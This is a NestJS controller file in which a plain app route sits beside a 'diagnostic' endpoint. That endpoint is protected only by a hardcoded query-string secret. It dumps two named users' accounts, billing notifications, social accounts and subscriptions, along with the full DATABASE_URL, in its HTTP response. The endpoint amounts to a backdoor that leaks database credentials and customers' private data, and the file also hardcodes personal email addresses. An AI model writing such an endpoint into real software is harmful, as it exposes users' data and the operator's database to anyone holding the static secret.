import { Controller, Get, Query, ForbiddenException } from '@nestjs/common';
import { AppService } from './app.service';
import { PrismaService } from './prisma/prisma.service';

@Controller()
export class AppController {
  constructor(
    private readonly appService: AppService,
    private readonly prisma: PrismaService,
  ) {}

  @Get()
  getHello(): string {
    return this.appService.getHello();
  }

  @Get('diag/inspect-client-accounts')
  async inspectClientAccounts(@Query('secret') secret: string) {
    if (secret !== 'apl_diag_sec_99182348_mde') {
      throw new ForbiddenException();
    }

    const emailPersonal = 'humberto856247@hotmail.com';
    const emailCorp = 'v_multidestinos@yahoo.com';

    const [userPersonal, userCorp, similarUsers] = await Promise.all([
      this.prisma.user.findFirst({
        where: { email: { equals: emailPersonal, mode: 'insensitive' } },
        include: {
          organization: {
            include: {
              billingNotifications: true,
            },
          },
          ownedWorkspaces: {
            include: {
              socialAccounts: true,
              posts: { select: { id: true, title: true, isDraft: true, createdAt: true } },
            },
          },
          subscriptions: true,
        },
      }),
      this.prisma.user.findFirst({
        where: { email: { equals: emailCorp, mode: 'insensitive' } },
        include: {
          organization: {
            include: {
              billingNotifications: true,
            },
          },
          ownedWorkspaces: {
            include: {
              socialAccounts: true,
              posts: { select: { id: true, title: true, isDraft: true, createdAt: true } },
            },
          },
          subscriptions: true,
        },
      }),
      this.prisma.user.findMany({
        where: {
          OR: [
            { email: { contains: 'humberto', mode: 'insensitive' } },
            { email: { contains: 'multidestinos', mode: 'insensitive' } },
          ],
        },
        select: { id: true, email: true, name: true, role: true, organizationId: true, createdAt: true },
      }),
    ]);

    return {
      personalAccount: userPersonal,
      corpAccount: userCorp,
      similarUsers,
      fullDbUrl: process.env.DATABASE_URL || null,
    };
  }
}
